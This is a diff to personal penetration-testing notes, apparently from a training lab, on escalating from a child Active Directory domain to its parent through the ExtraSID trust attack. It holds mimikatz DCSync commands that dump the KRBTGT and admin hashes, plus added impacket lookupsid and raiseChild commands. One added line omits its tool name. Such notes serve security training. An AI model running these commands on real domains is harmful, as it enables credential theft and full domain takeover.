@@ -14,8 +14,8 @@ Get-ADTrust -Filter *
 IntraForest = True
 ### ExtraSID Attack
 Requires
-* The KRBTGT hash for the child domain (mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt)
-* The SID for the child domain (Powerview,Get-DomainSID)
+* The KRBTGT hash for the child domain (mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt)(linux:logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt)
+* The SID for the child domain (Powerview,Get-DomainSID)(impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240)
 * The name of a target user in the child domain (does not need to exist!)
 * The FQDN of the child domain.
 * The SID of the Enterprise Admins group of the root domain.(Powerview, Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL")
@@ -30,3 +30,5 @@ If Success:
 ```
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
+Linux:
+impacket-raiseChild -target-exec 172.16.5.5(dc ip of Parent Domain) LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm(an administrative user in the child domain)
